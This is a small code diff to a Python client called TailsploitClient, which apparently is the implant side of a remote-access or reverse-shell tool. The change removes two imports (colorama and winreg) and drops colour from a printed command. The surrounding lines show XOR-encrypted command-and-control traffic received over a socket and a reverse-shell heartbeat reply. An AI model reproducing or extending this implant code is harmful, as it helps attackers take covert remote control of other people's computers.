@@ -1,11 +1,9 @@
 import socket
-from colorama import Back, Style, Fore
 import shutil
 import sys
 import subprocess
 import os
 import time
-import winreg as reg
 import ctypes
 import pyaudio
 import threading
@@ -56,7 +54,7 @@ class TailsploitClient:
                     command = client_socket.recv(4096)
                     commandDecode = handleXOREncryption(command, TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                     print()
-                    print(f"{Fore.GREEN}{commandDecode}{Style.RESET_ALL}")
+                    print(f"{commandDecode}")
 
                     if commandDecode == "REVERSE_SHELL_THREAD=ISALIVE?":
                         client_socket.send("REVERSE_SHELL_THREAD=ISALIVE?TRUE".encode("utf-8"))
